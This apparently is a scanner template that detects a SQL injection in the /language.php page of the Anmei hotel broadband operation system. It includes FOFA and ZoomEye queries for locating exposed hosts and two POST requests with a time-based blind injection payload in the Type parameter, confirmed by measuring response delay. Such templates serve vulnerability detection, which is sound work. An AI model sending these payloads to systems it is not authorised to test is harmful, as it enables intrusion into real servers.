id: amtt-hiboss-language-sqli

info:
  name: 安美数字酒店宽带运营系统SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    FOFA: title=酒店宽带运营系统
    ZoomEye: app:"安美数字酒店宽带运营系统"
  tags: amtt,hiboss,sqli
  created: 2023/10/25

rules:
  r0:
    request:
      method: POST
      path: /language.php
      body: |-
        EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
    expression: response.status == 200 && response.body.bcontains(b'语言管理') && response.latency <= 11000 &&  response.latency >= 10000 
  r1:
    request:
      method: POST
      path: /language.php
      body: |-
        EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
    expression: response.status == 200 && response.body.bcontains(b'语言管理') && response.latency <= 7000 &&  response.latency >= 6000 
expression: r0() && r1()